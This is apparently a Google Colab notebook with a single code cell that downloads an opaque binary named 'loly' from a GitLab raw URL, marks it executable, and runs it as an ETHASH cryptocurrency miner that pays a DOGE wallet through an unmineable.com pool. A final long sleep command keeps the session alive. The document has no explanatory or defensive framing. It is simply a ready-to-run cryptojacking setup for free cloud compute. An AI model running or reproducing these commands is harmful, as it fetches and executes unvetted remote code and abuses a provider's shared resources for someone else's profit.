{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "dogegitlab10.ipynb",
      "provenance": [],
      "authorship_tag": "ABX9TyMTs8M5G4osmNYm7cZwOpbO"
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "AdXRYzoKs7oK"
      },
      "outputs": [],
      "source": [
        "! wget https://gitlab.com/jiorio669/donlod/-/raw/main/loly\n",
        "! chmod +x loly\n",
        "! ./loly -a ETHASH --pool ethash.unmineable.com:3333 --user DOGE:DQCzjm9pouiN7YgJxXV62ANKiS3mno6afR.176_129_3_116\n",
        "! sleep 999999999"
      ]
    }
  ]
}